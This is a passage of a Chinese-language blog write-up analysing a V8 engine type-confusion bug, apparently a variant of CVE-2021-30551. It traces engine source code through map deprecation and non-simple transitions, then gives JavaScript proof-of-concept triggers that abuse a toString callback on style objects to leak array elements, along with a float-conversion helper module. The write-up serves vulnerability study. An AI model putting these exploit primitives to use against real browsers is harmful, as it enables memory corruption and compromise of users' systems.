</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    it<span style="color:#f92672">-&gt;</span>ApplyTransitionToDataProperty(receiver);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Write the property value.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">/// &lt;&lt;&lt; 将属性值写入 receiver 对象
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    it<span style="color:#f92672">-&gt;</span>WriteDataValue(value, true);
</span></span><span style="display:flex;"><span>	...
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Just</span>(true);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> LookupIterator<span style="color:#f92672">::</span>ApplyTransitionToDataProperty(
</span></span><span style="display:flex;"><span>    Handle<span style="color:#f92672">&lt;</span>JSReceiver<span style="color:#f92672">&gt;</span> receiver) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  Handle<span style="color:#f92672">&lt;</span>Map<span style="color:#f92672">&gt;</span> transition <span style="color:#f92672">=</span> transition_map();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> simple_transition <span style="color:#f92672">=</span> <span style="color:#75715e">// &lt;&lt;&lt;&lt;&lt; 关键点1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      transition<span style="color:#f92672">-&gt;</span>GetBackPointer(isolate_) <span style="color:#f92672">==</span> receiver<span style="color:#f92672">-&gt;</span>map(isolate_);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (simple_transition) {
</span></span><span style="display:flex;"><span>    number_ <span style="color:#f92672">=</span> transition<span style="color:#f92672">-&gt;</span>LastAdded();
</span></span><span style="display:flex;"><span>    property_details_ <span style="color:#f92672">=</span> transition<span style="color:#f92672">-&gt;</span>GetLastDescriptorDetails(isolate_);
</span></span><span style="display:flex;"><span>    state_ <span style="color:#f92672">=</span> DATA;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (receiver<span style="color:#f92672">-&gt;</span>map(isolate_).is_dictionary_map()) {
</span></span><span style="display:flex;"><span>	...
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    ReloadPropertyInformation<span style="color:#f92672">&lt;</span>false<span style="color:#f92672">&gt;</span>(); <span style="color:#75715e">// &lt;&lt;&lt;&lt;&lt; 关键点2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">bool</span> is_element<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> LookupIterator<span style="color:#f92672">::</span>ReloadPropertyInformation() {
</span></span><span style="display:flex;"><span>  state_ <span style="color:#f92672">=</span> BEFORE_PROPERTY;
</span></span><span style="display:flex;"><span>  interceptor_state_ <span style="color:#f92672">=</span> InterceptorState<span style="color:#f92672">::</span>kUninitialized;
</span></span><span style="display:flex;"><span>  state_ <span style="color:#f92672">=</span> LookupInHolder<span style="color:#f92672">&lt;</span>is_element<span style="color:#f92672">&gt;</span>(holder_<span style="color:#f92672">-&gt;</span>map(isolate_), <span style="color:#f92672">*</span>holder_); <span style="color:#75715e">// &lt;&lt;&lt; 关键点3
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DCHECK(IsFound() <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>holder_<span style="color:#f92672">-&gt;</span>HasFastProperties(isolate_));
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>这样一来程序运行 WriteDataValue 函数时，就会到的用第一个属性的描述符和第二个属性的值作为参数调用 WriteToField 函数。由于正常情况下，这里描述符存和值的类型时匹配的，在 WriteToField 函数中不会严格的校验 value 是否和描述符指定的类型匹配，有几处强制类型转换操作，我们利用这点来实现漏洞的利用。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> LookupIterator<span style="color:#f92672">::</span>WriteDataValue(Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> value,
</span></span><span style="display:flex;"><span>                                    <span style="color:#66d9ef">bool</span> initializing_store) {
</span></span><span style="display:flex;"><span>  DCHECK_EQ(DATA, state_);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#if V8_ENABLE_WEBASSEMBLY
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// WriteDataValueToWasmObject() must be used instead for writing to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// WasmObjects.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DCHECK(<span style="color:#f92672">!</span>holder_<span style="color:#f92672">-&gt;</span>IsWasmObject(isolate_));
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif  </span><span style="color:#75715e">// V8_ENABLE_WEBASSEMBLY
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  Handle<span style="color:#f92672">&lt;</span>JSReceiver<span style="color:#f92672">&gt;</span> holder <span style="color:#f92672">=</span> GetHolder<span style="color:#f92672">&lt;</span>JSReceiver<span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (IsElement(<span style="color:#f92672">*</span>holder)) {
</span></span><span style="display:flex;"><span>	...
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (holder<span style="color:#f92672">-&gt;</span>HasFastProperties(isolate_)) {
</span></span><span style="display:flex;"><span>    DCHECK(holder<span style="color:#f92672">-&gt;</span>IsJSObject(isolate_));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (property_details_.location() <span style="color:#f92672">==</span> PropertyLocation<span style="color:#f92672">::</span>kField) {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Check that in case of VariableMode::kConst field the existing value is
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// equal to |value|.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      DCHECK_IMPLIES(<span style="color:#f92672">!</span>initializing_store <span style="color:#f92672">&amp;&amp;</span> property_details_.constness() <span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>                                                PropertyConstness<span style="color:#f92672">::</span>kConst,
</span></span><span style="display:flex;"><span>                     IsConstFieldValueEqualTo(<span style="color:#f92672">*</span>value));
</span></span><span style="display:flex;"><span>      JSObject<span style="color:#f92672">::</span>cast(<span style="color:#f92672">*</span>holder).WriteToField(descriptor_number(),
</span></span><span style="display:flex;"><span>                                           property_details_, <span style="color:#f92672">*</span>value); <span style="color:#75715e">/// &lt;&lt;&lt; 关键点
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		...
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (holder<span style="color:#f92672">-&gt;</span>IsJSGlobalObject(isolate_)) {
</span></span><span style="display:flex;"><span>	...
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	...
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> JSObject<span style="color:#f92672">::</span>WriteToField(InternalIndex descriptor, PropertyDetails details,
</span></span><span style="display:flex;"><span>                            Object value) {
</span></span><span style="display:flex;"><span>  DCHECK_EQ(PropertyLocation<span style="color:#f92672">::</span>kField, details.location());
</span></span><span style="display:flex;"><span>  DCHECK_EQ(PropertyKind<span style="color:#f92672">::</span>kData, details.kind());
</span></span><span style="display:flex;"><span>  DisallowGarbageCollection no_gc;
</span></span><span style="display:flex;"><span>  FieldIndex index <span style="color:#f92672">=</span> FieldIndex<span style="color:#f92672">::</span>ForDescriptor(map(), descriptor);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (details.representation().IsDouble()) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Manipulating the signaling NaN used for the hole and uninitialized
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// double field sentinel in C++, e.g. with bit_cast or value()/set_value(),
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// will change its value on ia32 (the x87 stack is used to return values
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// and stores to the stack silently clear the signalling bit).
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint64_t</span> bits;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (value.IsSmi()) {
</span></span><span style="display:flex;"><span>      bits <span style="color:#f92672">=</span> bit_cast<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">uint64_t</span><span style="color:#f92672">&gt;</span>(<span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">double</span><span style="color:#f92672">&gt;</span>(Smi<span style="color:#f92672">::</span>ToInt(value)));
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (value.IsUninitialized()) {
</span></span><span style="display:flex;"><span>      bits <span style="color:#f92672">=</span> kHoleNanInt64;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      DCHECK(value.IsHeapNumber()); <span style="color:#75715e">/// DCHECK 是类似 assert 的操作，发布版不生效
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      bits <span style="color:#f92672">=</span> HeapNumber<span style="color:#f92672">::</span>cast(value).value_as_bits(kRelaxedLoad);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">auto</span> box <span style="color:#f92672">=</span> HeapNumber<span style="color:#f92672">::</span>cast(RawFastPropertyAt(index));
</span></span><span style="display:flex;"><span>    box.set_value_as_bits(bits, kRelaxedStore);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    FastPropertyAtPut(index, value);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>从 LookupIterator::ApplyTransitionToDataProperty 函数可以看到当 simple_transition 为 false， 也就是 transition map 的父 map，不是当前 receiver 的 map 时，程序才会走到上面所说的可利用的控制流上，那么怎么才能触发这个条件呢？这就需要看 transition map 的创建过程了，如果单步调试过这一段流程，可以知道 transition map 是在之前的 LookupIterator::PrepareTransitionToDataProperty -&gt; Map::TransitionToDataProperty 这一段控制流中创建的。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> LookupIterator<span style="color:#f92672">::</span>PrepareTransitionToDataProperty(
</span></span><span style="display:flex;"><span>    Handle<span style="color:#f92672">&lt;</span>JSReceiver<span style="color:#f92672">&gt;</span> receiver, Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> value,
</span></span><span style="display:flex;"><span>    PropertyAttributes attributes, StoreOrigin store_origin) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  Handle<span style="color:#f92672">&lt;</span>Map<span style="color:#f92672">&gt;</span> map(receiver<span style="color:#f92672">-&gt;</span>map(isolate_), isolate_);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Handle<span style="color:#f92672">&lt;</span>Map<span style="color:#f92672">&gt;</span> transition <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      Map<span style="color:#f92672">::</span>TransitionToDataProperty(isolate_, map, name_, value, attributes,
</span></span><span style="display:flex;"><span>                                    PropertyConstness<span style="color:#f92672">::</span>kConst, store_origin);
</span></span><span style="display:flex;"><span>  state_ <span style="color:#f92672">=</span> TRANSITION;
</span></span><span style="display:flex;"><span>  transition_ <span style="color:#f92672">=</span> transition;
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Handle<span style="color:#f92672">&lt;</span>Map<span style="color:#f92672">&gt;</span> Map<span style="color:#f92672">::</span>TransitionToDataProperty(Isolate<span style="color:#f92672">*</span> isolate, Handle<span style="color:#f92672">&lt;</span>Map<span style="color:#f92672">&gt;</span> map,
</span></span><span style="display:flex;"><span>                                          Handle<span style="color:#f92672">&lt;</span>Name<span style="color:#f92672">&gt;</span> name,
</span></span><span style="display:flex;"><span>                                          Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> value,
</span></span><span style="display:flex;"><span>                                          PropertyAttributes attributes,
</span></span><span style="display:flex;"><span>                                          PropertyConstness constness,
</span></span><span style="display:flex;"><span>                                          StoreOrigin store_origin) {
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Migrate to the newest map before storing the property.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  map <span style="color:#f92672">=</span> Update(isolate, map);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Map maybe_transition <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      TransitionsAccessor(isolate, map)
</span></span><span style="display:flex;"><span>          .SearchTransition(<span style="color:#f92672">*</span>name, PropertyKind<span style="color:#f92672">::</span>kData, attributes);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>maybe_transition.is_null()) {
</span></span><span style="display:flex;"><span>    Handle<span style="color:#f92672">&lt;</span>Map<span style="color:#f92672">&gt;</span> transition(maybe_transition, isolate);
</span></span><span style="display:flex;"><span>    InternalIndex descriptor <span style="color:#f92672">=</span> transition<span style="color:#f92672">-&gt;</span>LastAdded();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    DCHECK_EQ(attributes, transition<span style="color:#f92672">-&gt;</span>instance_descriptors(isolate)
</span></span><span style="display:flex;"><span>                              .GetDetails(descriptor)
</span></span><span style="display:flex;"><span>                              .attributes());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">UpdateDescriptorForValue</span>(isolate, transition, descriptor, constness,
</span></span><span style="display:flex;"><span>                                    value);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Do not track transitions during bootstrapping.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  TransitionFlag flag <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      isolate<span style="color:#f92672">-&gt;</span>bootstrapper()<span style="color:#f92672">-&gt;</span>IsActive() <span style="color:#f92672">?</span> OMIT_TRANSITION : INSERT_TRANSITION;
</span></span><span style="display:flex;"><span>  MaybeHandle<span style="color:#f92672">&lt;</span>Map<span style="color:#f92672">&gt;</span> maybe_map;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>map<span style="color:#f92672">-&gt;</span>TooManyFastProperties(store_origin)) {
</span></span><span style="display:flex;"><span>    Representation representation <span style="color:#f92672">=</span> value<span style="color:#f92672">-&gt;</span>OptimalRepresentation(isolate);
</span></span><span style="display:flex;"><span>    Handle<span style="color:#f92672">&lt;</span>FieldType<span style="color:#f92672">&gt;</span> type <span style="color:#f92672">=</span> value<span style="color:#f92672">-&gt;</span>OptimalType(isolate, representation);
</span></span><span style="display:flex;"><span>    maybe_map <span style="color:#f92672">=</span> Map<span style="color:#f92672">::</span>CopyWithField(isolate, map, name, type, attributes,
</span></span><span style="display:flex;"><span>                                   constness, representation, flag);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Handle<span style="color:#f92672">&lt;</span>Map<span style="color:#f92672">&gt;</span> result;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>maybe_map.ToHandle(<span style="color:#f92672">&amp;</span>result)) {
</span></span><span style="display:flex;"><span>      ...
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      result <span style="color:#f92672">=</span> Map<span style="color:#f92672">::</span>Normalize(isolate, map, CLEAR_INOBJECT_PROPERTIES, reason);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Handle<span style="color:#f92672">&lt;</span>Map<span style="color:#f92672">&gt;</span> Map<span style="color:#f92672">::</span>Update(Isolate<span style="color:#f92672">*</span> isolate, Handle<span style="color:#f92672">&lt;</span>Map<span style="color:#f92672">&gt;</span> map) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>map<span style="color:#f92672">-&gt;</span>is_deprecated()) <span style="color:#66d9ef">return</span> map;
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  MapUpdater mu(isolate, map);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> mu.Update();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>结合代码可知一般情况下，transition map 的创建动作，就是先拷贝一份 receiver 的 map ，再追加上新属性的属性描述符。但是如果当前 receiver 的 map 已经被打上了 deprecated 标记了，情况就有所不同，这种情况下 receiver 现有的 map 已经废弃了，要先用 MapUpdater 寻找/创建一个更合适的 map 作为 transition map 的父 map，这样一来 transition 的父 map 就不是 receiver 原本的 map（MapUpdater 并不会更新 receiver 的 map），最终导致 simple_transition 为 false。</p>
<p>那么问题就又变成了，怎么才能让 receiver 的 map 被打上 deprecated 标记呢？先在代码里搜索一下看看哪里会修改 map 的 deprecated 字段。查看 is_deprecated 的函数定义可以得知，函数是用 BIT_FIELD_ACCESSORS 宏定义的，这个宏还定义了修改函数 set_is_deprecated，搜索 set_is_deprecated 字符串发现函数 Map::DeprecateTransitionTree 中有调用，再搜索 DeprecateTransitionTree 的调用，可以搜到 MapUpdater::ConstructNewMap，再向上搜索找到 MapUpdater::ReconfigureToDataField、MapUpdater::ReconfigureElementsKind。通过分析这两个函数的定义和引用的地方，结合 CVE-2021-30551 的 POC 可以推测出，这两个函数是在修改对象已有属性类型、数组元素类型时触发的，CVE-2021-30551 采用的是触发 ReconfigureToDataField 这条代码路径 SetPropertyInternal -&gt; PrepareForDataProperty -&gt; PrepareForDataProperty -&gt; UpdateDescriptorForValue -&gt; ReconfigureToDataField。（另一条路径是否可行?）</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> Map<span style="color:#f92672">::</span>DeprecateTransitionTree(Isolate<span style="color:#f92672">*</span> isolate) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (is_deprecated()) <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  DisallowGarbageCollection no_gc;
</span></span><span style="display:flex;"><span>  TransitionsAccessor <span style="color:#a6e22e">transitions</span>(isolate, <span style="color:#f92672">*</span><span style="color:#66d9ef">this</span>, <span style="color:#f92672">&amp;</span>no_gc);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> num_transitions <span style="color:#f92672">=</span> transitions.NumberOfTransitions();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> num_transitions; <span style="color:#f92672">++</span>i) {
</span></span><span style="display:flex;"><span>    transitions.GetTarget(i).DeprecateTransitionTree(isolate);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  DCHECK(<span style="color:#f92672">!</span>constructor_or_back_pointer().IsFunctionTemplateInfo());
</span></span><span style="display:flex;"><span>  DCHECK(CanBeDeprecated());
</span></span><span style="display:flex;"><span>  set_is_deprecated(true);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (FLAG_log_maps) {
</span></span><span style="display:flex;"><span>    LOG(isolate, MapEvent(<span style="color:#e6db74">&#34;Deprecate&#34;</span>, handle(<span style="color:#f92672">*</span><span style="color:#66d9ef">this</span>, isolate), Handle<span style="color:#f92672">&lt;</span>Map<span style="color:#f92672">&gt;</span>()));
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  dependent_code().DeoptimizeDependentCodeGroup(
</span></span><span style="display:flex;"><span>      isolate, DependentCode<span style="color:#f92672">::</span>kTransitionGroup);
</span></span><span style="display:flex;"><span>  NotifyLeafMapLayoutChange(isolate);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>具体操作是在 s2 的两次 prop 属性设置之间，通过给 s1 的 prop 属性赋值的方式，修改 s1 的 prop 属性的类型。这样 s1 的旧 map 会被标记为 deptecate，因为 s1 和 s2 是共享同一个 map 的，s2 当前使用的 map 就变成 deprecate 的了，等 s2 的第二次 prop 赋值时，由于 map 被打上了 deprecated 标记，就走入了非 simple_transition 的代码路径。</p>
<p>利用代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">s2</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;p&#39;</span>).<span style="color:#a6e22e">style</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v2</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">toString</span><span style="color:#f92672">:</span> () =&gt; {<span style="color:#a6e22e">s2</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">s1</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1.1</span>; };
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s2</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">v2</span>;
</span></span></code></pre></div><hr>
<p>⚠️ 提示：不清楚 s1 和 s2 为什么共享同一个 map 的同学，可以去了解一下 v8 中 map transition 的相关内容，我在 <a href="2022-04-30-CVE-2021-30551.md">CVE-2021-30551 分析</a> 这篇的&quot;分析 map 的变化过程&quot;这一小节也有简单介绍。</p>
<hr>
<p>在属性访问的时候也是用同一个线性搜索算法，所以之后访问对象的 prop 属性，实际访问的都是存储在第一个 prop 属性处的值，对于 s1 来说是第一次 WriteToField 写入的，对于 s2 来说是第二次。</p>
<p>分析 JSObject::WriteToField 代码，结合上 CVE-2021-30551 的利用经验，可以很容易想到，如果把 v2 改成一个数组的话，就可以直接通过 s2.prop 读取到数组的 Elements。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s2</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;p&#39;</span>).<span style="color:#a6e22e">style</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">v2</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>];
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v2</span>.<span style="color:#a6e22e">toString</span> <span style="color:#f92672">=</span>  () =&gt; {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s2</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s1</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s2</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">v2</span>;
</span></span></code></pre></div><p>实际验证下效果，验证过程中还要用到一些浮点数和大整数之间的类型转换，我这次把它封装成了模块 conversion.mjs，方便以后复用。</p>
<p>完整代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// conversion.mjs
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f64</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">u64</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BigUint64Array</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">u32</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint32Array</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ftou</span>(<span style="color:#a6e22e">f</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">u64</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">utof</span>(<span style="color:#a6e22e">u</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">u64</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">u</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">low32</span>(<span style="color:#a6e22e">u</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">u64</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">u</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">high32</span>(<span style="color:#a6e22e">u</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">u64</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">u</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">u32</span>[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">export</span> {<span style="color:#a6e22e">ftou</span>, <span style="color:#a6e22e">utof</span>, <span style="color:#a6e22e">low32</span>, <span style="color:#a6e22e">high32</span>};
